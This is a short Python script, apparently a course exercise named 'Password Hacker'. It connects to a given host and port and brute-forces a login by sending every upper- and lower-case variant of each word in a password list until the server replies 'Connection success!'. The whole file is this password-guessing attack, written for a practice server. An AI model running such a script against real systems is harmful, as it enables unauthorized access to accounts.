import socket
import sys
import itertools

args = sys.argv
if len(args) == 3:
    hostname, port = args[1], int(args[2])


with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)

    with open("/Users/unicornhorn/PycharmProjects/Password Hacker/Password Hacker/task/hacking/password.txt", 'r') as f:
        def new_line():
            for line in f:
                yield line.strip()

        password = None
        response = None
        generator = new_line()

        while response != "Connection success!":
            try:
                raw_pass = next(generator)
                variations = map(''.join, itertools.product(*zip(raw_pass.upper(), raw_pass.lower())))
                for message in variations:
                    message = message.encode()
                    client_socket.send(message)
                    response = client_socket.recv(1024)
                    response = response.decode()
                    if response == "Connection success!":
                        password = message.decode()
                        print(password)
                        break
                    elif response == "Wrong password!":
                        continue
                    else:
                        break
            except StopIteration:
                print("Wrong password!")
                break



